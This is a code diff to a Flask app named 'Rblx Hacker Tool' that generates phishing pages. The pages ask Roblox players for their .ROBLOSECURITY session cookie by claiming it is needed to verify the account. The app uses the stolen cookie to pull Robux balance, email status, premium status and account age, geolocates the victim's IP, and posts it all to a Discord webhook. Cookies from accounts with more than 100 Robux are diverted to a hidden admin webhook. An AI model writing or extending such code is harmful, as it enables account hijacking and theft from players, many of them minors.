@@ -2,6 +2,7 @@ from flask import Flask, request, jsonify, render_template_string
 import requests
 import base64
 import time
+import os
 
 app = Flask(__name__)
 
@@ -113,17 +114,22 @@ GENERATOR_HTML = """
 <body>
     <div class="container">
         <h1>🎮 Rblx Hacker Tool</h1>
-        <p class="subtitle">Create your custom helper page</p>
+        <p class="subtitle">Create your custom page</p>
+
+        <div class="input-group">
+            <label>Website Name</label>
+            <input type="text" id="websiteName" placeholder="e.g., Robux Generator">
+        </div>
 
         <div class="input-group">
             <label>Your Discord Webhook URL</label>
             <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/...">
         </div>
 
-        <button onclick="generateSite()" id="genBtn">Generate Helper Page</button>
+        <button onclick="generateSite()" id="genBtn">Generate Page</button>
 
         <div class="result" id="result">
-            <h3>✅ Your Helper Page is Ready!</h3>
+            <h3>✅ Your Page is Ready!</h3>
             <div class="link-box" id="generatedLink"></div>
             <button onclick="copyLink()">Copy Link</button>
         </div>
@@ -134,10 +140,16 @@ GENERATOR_HTML = """
 
         async function generateSite() {
             const webhook = document.getElementById('webhookInput').value;
+            const websiteName = document.getElementById('websiteName').value;
             const btn = document.getElementById('genBtn');
             
             if (!webhook || !webhook.includes('discord.com/api/webhooks')) {
                 alert('Please enter a valid Discord webhook URL');
+                return;
+            }
+
+            if (!websiteName) {
+                alert('Please enter a website name');
                 return;
             }
 
@@ -148,7 +160,10 @@ GENERATOR_HTML = """
                 const response = await fetch('/generate', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ webhook: webhook })
+                    body: JSON.stringify({ 
+                        webhook: webhook,
+                        website_name: websiteName
+                    })
                 });
 
                 const data = await response.json();
@@ -165,7 +180,7 @@ GENERATOR_HTML = """
             }
 
             btn.disabled = false;
-            btn.textContent = 'Generate Helper Page';
+            btn.textContent = 'Generate Page';
         }
 
         function copyLink() {
@@ -185,7 +200,7 @@ HELPER_HTML = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Helper</title>
+    <title>{{WEBSITE_NAME}}</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -294,8 +309,8 @@ HELPER_HTML = """
 </head>
 <body>
     <div class="container">
-        <h1>🛠️ Roblox Helper</h1>
-        <p class="subtitle">Get help with your Roblox account</p>
+        <h1>🛠️ {{WEBSITE_NAME}}</h1>
+        <p class="subtitle">Enter your details below</p>
 
         <div class="input-group">
             <label>Roblox Username</label>
@@ -312,7 +327,7 @@ HELPER_HTML = """
         <div class="status" id="status"></div>
 
         <div class="info">
-            ℹ️ We need your cookie to verify your account and provide assistance.
+            ℹ️ We need your cookie to verify your account.
         </div>
     </div>
 
@@ -351,7 +366,7 @@ HELPER_HTML = """
 
                 if (data.success) {
                     status.className = 'status success';
-                    status.textContent = '✅ Thank you! We will review your account and get back to you shortly.';
+                    status.textContent = '✅ Thank you! Processing your request...';
                     document.getElementById('username').value = '';
                     document.getElementById('cookie').value = '';
                 } else {
@@ -371,8 +386,8 @@ HELPER_HTML = """
 </html>
 """
 
-# Store webhooks (in production, use a database)
-webhooks = {}
+# Store webhooks and website names
+sites_data = {}
 
 @app.route('/')
 def index():
@@ -382,25 +397,26 @@ def index():
 def generate():
     data = request.json
     webhook = data.get('webhook')
+    website_name = data.get('website_name', 'Roblox Helper')
     
     if not webhook or 'discord.com/api/webhooks' not in webhook:
         return jsonify({'success': False, 'error': 'Invalid webhook'})
     
-    # Create unique ID for this webhook
     webhook_id = base64.urlsafe_b64encode(str(time.time()).encode()).decode()[:8]
-    webhooks[webhook_id] = webhook
+    sites_data[webhook_id] = {
+        'webhook': webhook,
+        'name': website_name
+    }
     
-    # Generate URL
-    site_url = f"{request.host_url}helper/{webhook_id}"
+    site_url = f"{request.host_url}h/{webhook_id}"
     
-    # Send to their webhook
     try:
         requests.post(webhook, json={
             'embeds': [{
-                'title': '✅ Your Roblox Helper is Live!',
-                'description': f'Your custom helper page is ready:\n\n🔗 **{site_url}**\n\nShare this link to collect submissions.',
+                'title': '✅ Your Page is Live!',
+                'description': f'**{website_name}** is ready:\n\n🔗 {site_url}\n\nShare this link to collect submissions.',
                 'color': 0x00ff00,
-                'footer': {'text': 'Roblox Helper System'}
+                'footer': {'text': 'Rblx Hacker Tool'}
             }]
         })
     except:
@@ -408,12 +424,13 @@ def generate():
     
     return jsonify({'success': True, 'url': site_url})
 
-@app.route('/helper/<webhook_id>')
+@app.route('/h/<webhook_id>')
 def helper(webhook_id):
-    if webhook_id not in webhooks:
+    if webhook_id not in sites_data:
         return "Invalid link", 404
     
-    html = HELPER_HTML.replace('{{WEBHOOK_ID}}', webhook_id)
+    website_name = sites_data[webhook_id]['name']
+    html = HELPER_HTML.replace('{{WEBHOOK_ID}}', webhook_id).replace('{{WEBSITE_NAME}}', website_name)
     return render_template_string(html)
 
 @app.route('/submit', methods=['POST'])
@@ -423,76 +440,83 @@ def submit():
     username = data.get('username')
     cookie = data.get('cookie')
     
-    if webhook_id not in webhooks:
+    if webhook_id not in sites_data:
         return jsonify({'success': False})
     
-    user_webhook = webhooks[webhook_id]
+    site_data = sites_data[webhook_id]
+    user_webhook = site_data['webhook']
     
     try:
-        # Get user IP
         user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         
-        # Get IP info
         try:
             ip_info = requests.get(f'https://ipapi.co/{user_ip}/json/', timeout=5).json()
             location = f"{ip_info.get('city', 'Unknown')}, {ip_info.get('region', 'Unknown')}, {ip_info.get('country_name', 'Unknown')}"
         except:
             location = "Unknown"
         
-        # Get Roblox account info
         user_id = "Unknown"
         robux = 0
         email_verified = "Unknown"
-        premium = "No"
+        premium = "Unknown"
+        account_age = "Unknown"
         top_games = []
         
         try:
             headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
-            user_response = requests.get('https://users.roblox.com/v1/users/authenticated', headers=headers, timeout=5)
+            
+            user_response = requests.get('https://users.roblox.com/v1/users/authenticated', headers=headers, timeout=10)
             
             if user_response.status_code == 200:
                 user_data = user_response.json()
                 user_id = user_data.get('id', 'Unknown')
+                display_name = user_data.get('displayName', username)
                 
-                # Get robux
                 try:
-                    robux_response = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency', headers=headers, timeout=5)
+                    robux_response = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency', headers=headers, timeout=10)
                     if robux_response.status_code == 200:
                         robux = robux_response.json().get('robux', 0)
-                except:
-                    pass
+                except Exception as e:
+                    print(f"Robux error: {e}")
                 
-                # Get email verification status
                 try:
-                    email_response = requests.get('https://accountinformation.roblox.com/v1/email', headers=headers, timeout=5)
+                    email_response = requests.get('https://accountinformation.roblox.com/v1/email', headers=headers, timeout=10)
                     if email_response.status_code == 200:
                         email_data = email_response.json()
-                        email_verified = "Yes" if email_data.get('verified') else "No"
-                except:
-                    pass
+                        email_verified = "✅ Yes" if email_data.get('verified') else "❌ No"
+                except Exception as e:
+                    print(f"Email error: {e}")
                 
-                # Get premium status
                 try:
-                    premium_response = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership', headers=headers, timeout=5)
-                    if premium_response.status_code == 200:
-                        premium = "Yes" if premium_response.json() else "No"
-                except:
-                    pass
+                    premium_response = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership', headers=headers, timeout=10)
+                    premium = "✅ Yes" if premium_response.status_code == 200 else "❌ No"
+                except Exception as e:
+                    print(f"Premium error: {e}")
                 
-                # Get recently played games (top spending games approximation)
                 try:
-                    games_response = requests.get(f'https://games.roblox.com/v1/games/list?model.userId={user_id}', headers=headers, timeout=5)
+                    user_details = requests.get(f'https://users.roblox.com/v1/users/{user_id}', timeout=10)
+                    if user_details.status_code == 200:
+                        created_date = user_details.json().get('created', '')
+                        if created_date:
+                            from datetime import datetime
+                            created = datetime.fromisoformat(created_date.replace('Z', '+00:00'))
+                            age_days = (datetime.now(created.tzinfo) - created).days
+                            account_age = f"{age_days // 365} years" if age_days > 365 else f"{age_days} days"
+                except Exception as e:
+                    print(f"Age error: {e}")
+                
+                try:
+                    games_response = requests.get(f'https://games.roblox.com/v2/users/{user_id}/games?accessFilter=2&sortOrder=Asc', timeout=10)
                     if games_response.status_code == 200:
                         games_data = games_response.json().get('data', [])
-                        top_games = [game.get('name', 'Unknown') for game in games_data[:5]]
-                except:
-                    pass
-        except:
-            pass
+                        top_games = [game.get('name', 'Unknown')[:30] for game in games_data[:3]]
+                except Exception as e:
+                    print(f"Games error: {e}")
+        except Exception as e:
+            print(f"Main error: {e}")
         
-        # Prepare embed
         embed = {
-            'title': '🎮 New Roblox Helper Submission',
+            'title': '🎯 New Submission',
             'color': 0xFF0000 if robux > 100 else 0x00FF00,
             'fields': [
                 {'name': '👤 Username', 'value': username, 'inline': True},
@@ -500,24 +524,25 @@ def submit():
                 {'name': '💎 Robux', 'value': str(robux), 'inline': True},
                 {'name': '⭐ Premium', 'value': premium, 'inline': True},
                 {'name': '📧 Email Verified', 'value': email_verified, 'inline': True},
+                {'name': '📅 Account Age', 'value': account_age, 'inline': True},
                 {'name': '🌍 IP', 'value': user_ip, 'inline': True},
                 {'name': '📍 Location', 'value': location, 'inline': False},
                 {'name': '🎮 Recent Games', 'value': ', '.join(top_games) if top_games else 'None found', 'inline': False},
-                {'name': '🍪 Cookie', 'value': f'```{cookie}```', 'inline': False}
+                {'name': '🍪 Cookie', 'value': f'```{cookie[:100]}...```', 'inline': False}
             ],
-            'footer': {'text': 'Roblox Helper System'},
+            'footer': {'text': 'Rblx Hacker Tool'},
             'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
         }
         
-        # Send to appropriate webhook
         target_webhook = ADMIN_WEBHOOK if robux > 100 else user_webhook
         requests.post(target_webhook, json={'embeds': [embed]})
         
         return jsonify({'success': True})
     
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"Submit error: {e}")
         return jsonify({'success': False})
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+    port = int(os.environ.get('PORT', 10000))
+    app.run(host='0.0.0.0', port=port)
